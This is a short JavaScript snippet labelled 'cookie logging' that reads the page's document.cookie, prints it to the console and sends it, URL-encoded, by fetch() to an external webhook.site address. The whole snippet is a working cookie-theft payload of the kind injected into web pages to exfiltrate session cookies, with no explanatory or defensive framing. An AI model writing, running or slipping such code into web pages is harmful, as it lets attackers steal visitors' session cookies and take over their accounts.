// cookie logging
console.log("Cookies:", document.cookie);

fetch(
  "https://webhook.site/5f02b510-2a69-474b-8cb0-6a35c2f34d37?cookies=" +
    encodeURIComponent(document.cookie),
);
